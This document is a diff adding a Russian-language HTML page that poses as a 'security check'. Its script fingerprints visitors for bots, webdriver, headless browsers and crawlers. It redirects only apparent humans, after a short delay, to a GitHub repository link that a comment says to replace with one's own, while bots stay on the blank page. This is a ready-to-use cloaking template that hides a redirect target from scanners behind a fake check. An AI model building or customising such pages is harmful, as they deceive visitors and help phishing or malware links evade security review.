@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Проверка...</title>
+  <style>
+    body {
+      background-color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: sans-serif;
+      color: #444;
+    }
+  </style>
+</head>
+<body>
+  <div>Проверка безопасности... Подождите.</div>
+
+  <script>
+    function isBot() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      return (
+        navigator.webdriver ||
+        /bot|crawl|spider|crawling|facebookexternalhit|headless|phantomjs/.test(userAgent) ||
+        !navigator.plugins.length ||
+        !navigator.languages ||
+        !window.outerWidth ||
+        !window.outerHeight
+      );
+    }
+
+    if (!isBot()) {
+      setTimeout(() => {
+        // 🔁 ЗАМЕНИ ЭТУ ССЫЛКУ НА СВОЮ
+        window.location.href = "https://github.com/Veron1245/white.git";
+      }, 1500);
+    }
+    // Бот остаётся на этой странице
+  </script>
+</body>
+</html>
